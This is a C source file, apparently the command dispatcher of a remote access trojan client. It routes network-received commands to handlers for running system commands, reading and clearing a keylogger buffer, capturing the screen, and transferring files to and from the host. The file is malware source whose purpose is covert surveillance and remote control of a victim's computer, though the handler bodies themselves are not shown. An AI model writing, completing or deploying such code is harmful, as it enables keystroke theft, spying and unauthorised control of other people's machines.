#include <stdlib.h>
#include "types.h"
#include "client.h"
#include "cmd/commands.h"
#include "net/interface.h"
#include "net/error.h"

int commands_find(int cmd, uint8* msg)
{
	if(cmd == COMMANDS_SEND)
	{
		return command_Send(msg);
	}else if(cmd == COMMANDS_INFO){
		return command_Info();
	}else if(cmd == COMMANDS_TERMINATE){
		free(msg);

		client_Disconnect();
		exit(0);
	}else if(cmd == COMMANDS_SYSTEM){
		return command_System(msg);
	}else if(cmd == COMMANDS_KEYLOGGER_GET){
		return command_Keylogger_Get();
	}else if(cmd == COMMANDS_KEYLOGGER_SIZE){
		return command_Keylogger_Size();
	}else if(cmd == COMMANDS_KEYLOGGER_CLEAR){
		return command_Keylogger_Clear();
	}else if(cmd == COMMANDS_SCREEN_GET){
		return command_Screen_Get(msg);
	}else if(cmd == COMMANDS_GET_FILE){
		return command_Get_File(msg);
	}else if(cmd == COMMANDS_SEND_FILE){
		return command_Send_File(msg);
	}
	
	return 0;
}

int commands_Translate(uint8* msg)
{
	int cmd = msg[0];
	msg++;

	int rv = commands_find(cmd, msg);

	msg--;

	return rv;
}